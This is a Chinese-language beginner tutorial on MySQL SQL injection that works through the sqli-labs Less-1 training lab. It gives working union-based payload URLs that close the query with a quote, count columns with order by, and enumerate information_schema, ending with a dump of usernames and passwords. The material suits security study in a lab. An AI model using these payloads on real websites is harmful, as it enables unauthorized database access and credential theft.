前言

补充以下之前不翼而飞的sql注入入门篇文章，哈哈哈哈。。。。其实，早早的就发现了这个事情，奈何最近比较惨每天卷，实在是木得动力啊。。。现在打工人回归，让我来给老铁们重新更新一下这个文章。。方便老铁们和后面的基础文章达成一定的连贯性。。

一、什么是sql注入？

“神仙漏洞”sql注入用一句精辟的话总结就是程序开发人员对参数的控制不严谨而造成的问题啦。。。

那么，这个时候攻击者就有了可乘之机，攻击者通过把sql命令插到web表单中提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的sql命令的目的。。

二、mysql注入攻击的方法

对于mysql注入常用的方法有以下两种：

1.手工注入(考验能力和对sql注入的理解，可以挖掘出工具扫描不出来的一些漏洞，但是会比较耗时，最好会写一些小脚本，辅助手工)

2.使用工具注入(便捷，sqlmap、明小子等等)

三、mysql注入攻击查询基本信息的一些数据库内置函数

version() ：获取mysql版本信息

user()：获取当前数据库的用户名

database()：获取当前连接数据库名

@@datadir()：获取数据库路径

@@version_compile_os：操作系统版本

等等。。。。

当目标有回显的时候，我们可以将这些内置函数放在回显位置，来查看当前数据库及站点的基本信息

如果当前目标没有回显的时候，那么我们可以结合报错注入的语句，来查看当前数据库及站点的基本信息

字符串连接函数：group_concat() 可以使用该函数一次性查询多条信息，但需要注意的是group_concat()和limt不能连用，且其不能在报错注入的时候使用

Limit 0,1 使用这个语句可以逐个查询数据库中的

四、mysql基本注入方式之联合注入查询

确定SQL注入union攻击所需要的列数：

1.可以利用order by子句并递增指定的列索引，直到发生错误。

order by 1

order by 2

……

应用程序实际上可能会在其 HTTP 响应中返回数据库错误，或者它可能会返回一般错误，或者只是不返回任何结果。如果您可以检测到应用程序响应中的某些差异，您就可以推断出查询返回了多少列。

2.可以利用union select 指定不同数量的控制的有效负载：

http://172.20.10.13/sqli-labs/Less-1/

根据页面的提示，给该页面传递一个id参数值，观察页面变化

观察页面存在回显，这是件好事啊！说明可以尝试联合注入方式进行注入，不然的话，盲注、报错太头疼了

那么，接下来按照黑盒的想法就是根据测试判断该位置的注入类型是数字型还是字符类型的了(判断什么类型的主要是为了找到闭合方式进行闭合)，先输入个单引号尝试一下，看看页面反应： 还真给报错了！！！

那。。。就来分析一下这个报错语句吧！

下面这句话的大致意思就是告诉我们sql语句错误，具体的位置在 标红 位置处。。。。

You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1

那这个时候，尝试根据这个报错，就来推导一下该位置处的查询语句吧！

貌似应该是： select username，password from user where id = '$id' limit 0,1

尝试根据上面猜测出来的查询语句，做一下闭合，根据页面反应判断一下自己的猜测吧！ http://172.20.10.13/sqli-labs/Less-1/?id=1%27--+

果然，此时页面的回显正常了，那么也就说明，我们猜测的查询语句是对的，而当我们闭合的时候，查询语句变成了：

select username，password from user where id = '1’--+' limit 0,1

--+ 是myql的注释语句，其中+是代表空格的意思，这样就将查询位置的后单引号及后面的limit语句闭合了，这时就可以尝试利用order by语句来获取字段数

使用order by 数字 ，通过页面的返回异常和正常两种情况的临界值，来判断字段数

http://172.20.10.13/sqli-labs/Less-1/?id=1%27%20order%20by%203--+(页面显示正常) http://172.20.10.13/sqli-labs/Less-1/?id=1%27%20order%20by%204--+(页面显示异常)

说明字段数是3

接下来使用union select 1,2,3来判断回显位置

http://172.20.10.13/sqli-labs/Less-1/?id=-1%27%20union%20select%201,2,3--+

回显位置是2,3，那么在这两处数字位置就可以调用mysql数据库的内置参数来获取数据库的相关信息了

获取数据库信息及相关信息

获取数据库名称及数据库用户信息(数据库名称信息用于获取表信息，用户信息用于确定当前位置sql查询语句的用户权限)

http://172.20.10.13/sqli-labs/Less-1/?id=-1' union select 1,database(),user()--+

获取当前站点所用的数据库版本信息(这对下面一步怎样获取表信息及字段信息的方式有非常重要的作用)及当前操作系统版本信息(后续提权和信息收集) 为什么说数据库版本对于获取表信息那么重要呢？ 答：因为mysql5.0以上版本的mysql数据库，有一个information_schema的数据库，里面存储着站点所有的数据库的信息，可以通过查询information_schema数据库中的schemata、Tables和Columns直接获取数据库的表、列字段信息，简单快捷 如果是mysql5.0以下，那就，，，

http://172.20.10.13/sqli-labs/Less-1/?id=-1' union select 1,version(),@@version_compile_os--+

获取表信息 http://172.20.10.13/sqli-labs/Less-1/?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema = database() limit 1,1--+

其中，limit 1,1是逐个查询，我们此处也可以使用group_concat()函数一起获取 http://172.20.10.13/sqli-labs/Less-1/?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = database()--+

获取users表中的列名信息 http://172.20.10.13/sqli-labs/Less-1/?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' and table_schema=database()--+

根据获取到的列名信息，去查询具体的用户名信息吧 http://172.20.10.13/sqli-labs/Less-1/?id=-1' union select 1,group_concat(username),group_concat(password) from users--+
